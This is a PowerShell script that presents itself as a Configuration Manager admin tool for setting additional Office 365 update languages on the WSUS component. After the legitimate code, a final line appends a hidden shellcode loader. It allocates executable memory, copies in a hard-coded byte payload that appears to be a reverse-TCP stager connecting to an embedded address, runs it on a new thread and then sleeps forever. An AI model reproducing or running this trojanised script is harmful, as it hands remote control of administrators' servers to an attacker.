
[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true, HelpMessage="Site server where the SMS Provider is installed.")]
    [ValidateNotNullOrEmpty()]
    [ValidateScript({Test-Connection -ComputerName $_ -Count 1 -Quiet})]
    [string]$SiteServer,

    [parameter(Mandatory=$true, HelpMessage="Specify the additional languages as a string array. Pass an empty string to clear the existing additional languages.")]
    [ValidateNotNull()]
    [AllowEmptyString()]
    [ValidateSet("","en-us","ar-sa","bg-bg","zh-cn","zh-tw","hr-hr","cs-cz","da-dk","nl-nl","et-ee",
    "fi-fi","fr-fr","de-de","el-gr","he-il","hi-in","hu-hu","id-id","it-it","ja-jp",
    "kk-kz","ko-kr","lv-lv","lt-lt","ms-my","nb-no","pl-pl","pt-br","pt-pt","ro-ro",
    "ru-ru","sr-latn-rs","sk-sk","sl-si","es-es","sv-se","th-th","tr-tr","uk-ua","vi-vn")]
    [string[]]$Language
)
Begin {
    
    try {
        Write-Verbose -Message "Determining Site Code for Site server: '$($SiteServer)'"
        $SiteCodeObjects = Get-WmiObject -Namespace "root\SMS" -Class SMS_ProviderLocation -ComputerName $SiteServer -ErrorAction Stop
        foreach ($SiteCodeObject in $SiteCodeObjects) {
            if ($SiteCodeObject.ProviderForLocalSite -eq $true) {
                $SiteCode = $SiteCodeObject.SiteCode
                Write-Verbose -Message "Site Code: $($SiteCode)"
            }
        }
    }
    catch [System.UnauthorizedAccessException] {
        Write-Warning -Message "Access denied" ; break
    }
    catch [System.Exception] {
        Write-Warning -Message "Unable to determine Site Code" ; break
    }

    
    Write-Verbose -Message "Determine top level Site Code in hierarchy"
    $SiteDefinitions = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_SCI_SiteDefinition -ComputerName $SiteServer
    foreach ($SiteDefinition in $SiteDefinitions) {
        if ($SiteDefinition.ParentSiteCode -like [System.String]::Empty) {
            $TopLevelSiteCode = $SiteDefinition.SiteCode
            Write-Verbose -Message "Determined top level Site Code: $($TopLevelSiteCode)"
        }
    }

    
    $Languages = $Language -join ", "

}
Process {
    if ($TopLevelSiteCode -ne $null) {
        
        $WSUSComponent = Get-CimInstance -Namespace "root\SMS\site_$($SiteCode)" -ClassName SMS_SCI_Component -ComputerName $SiteServer -Verbose:$false | Where-Object -FilterScript { ($_.SiteCode -like $TopLevelSiteCode) -and ($_.ComponentName -like "SMS_WSUS_CONFIGURATION_MANAGER") }

        if ($WSUSComponent -ne $null) {
            
            $WSUSAdditionalUpdateLanguageProperty = $WSUSComponent.Props | Where-Object -FilterScript { $_.PropertyName -like "AdditionalUpdateLanguagesForO365" }

            if ($WSUSAdditionalUpdateLanguageProperty -ne $null) {
                
                $PropsIndex = 0
            
                
                foreach ($EmbeddedProperty in $WSUSComponent.Props) {
                    if ($EmbeddedProperty.PropertyName -like "AdditionalUpdateLanguagesForO365") {
                        Write-Verbose -Message "Amending AdditionalUpdateLanguagesForO365 embedded property with additional languages: $($Languages)"
                        $EmbeddedProperty.Value2 = $Languages
                        $WSUSComponent.Props[$PropsIndex] = $EmbeddedProperty
                    }

                    
                    $PropsIndex++
                }

                
                $PropsTable = @{
                    Props = $WSUSComponent.Props
                }

                
                try {
                    Get-CimInstance -InputObject $WSUSComponent -Verbose:$false | Set-CimInstance -Property $PropsTable -Verbose:$false -ErrorAction Stop
                    Write-Verbose -Message "Successfully amended AdditionalUpdateLanguagesForO365 embedded property"
                }
                catch [System.Exception] {
                    Write-Warning -Message $_.Exception.Message ; break
                }

                
                $WSUSComponent = Get-CimInstance -Namespace "root\SMS\site_$($SiteCode)" -ClassName SMS_SCI_Component -ComputerName $SiteServer -Verbose:$false | Where-Object -FilterScript { ($_.SiteCode -like $TopLevelSiteCode) -and ($_.ComponentName -like "SMS_WSUS_CONFIGURATION_MANAGER") }
                $WSUSAdditionalUpdateLanguageProperty = $WSUSComponent.Props | Where-Object -FilterScript { $_.PropertyName -like "AdditionalUpdateLanguagesForO365" }
                Write-Output -InputObject $WSUSAdditionalUpdateLanguageProperty
            }
        }
    }
    else {
        Write-Warning -Message "Unable to determine top level Site Code, bailing out"
    }
}
$hZX = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $hZX -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x5e,0x3d,0x41,0x02,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$PZzG=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($PZzG.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$PZzG,0,0,0);for (;;){Start-sleep 60};

